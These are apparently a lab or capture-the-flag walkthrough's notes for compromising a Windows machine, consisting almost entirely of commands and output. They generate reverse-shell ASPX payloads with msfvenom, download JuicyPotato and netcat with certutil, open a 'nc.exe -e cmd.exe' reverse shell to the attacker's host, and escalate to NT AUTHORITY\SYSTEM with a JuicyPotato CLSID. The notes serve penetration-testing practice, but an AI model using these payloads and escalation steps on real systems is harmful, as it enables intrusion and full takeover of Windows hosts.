### FTP send just like HTTP put. x64 and x86 payloads
```
msfvenom -p windows/x64/reverse_tcp LHOST=10.10.17.x LPORT=4242 -f aspx -o shell.aspx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.x LPORT=4242 -f aspx -o shell2.aspx
```

### whoami /priv, easy win
```
certutil -urlcache -f http://10.10.17.x/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -f http://10.10.17.x/nc.exe nc.exe
```

### Not working for x86 platform
```
JuicyPotato.exe
nc.exe -e cmd.exe 10.10.17.73 1234
```

### Get the x86 version
```
certutil -urlcache -f http://10.10.17.73/Juicy.Potato.x86.exe Juicy.Potato.x86.exe
Juicy.Potato.x86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Windows\temp\nc.exe -e cmd.exe 10.10.17.73 6789" -t *
rlwrap -cAr nc -lvnp 6789
```

### rooted
```
Juicy.Potato.x86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Windows\temp\nc.exe -e cmd.exe 10.10.17.73 6789" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```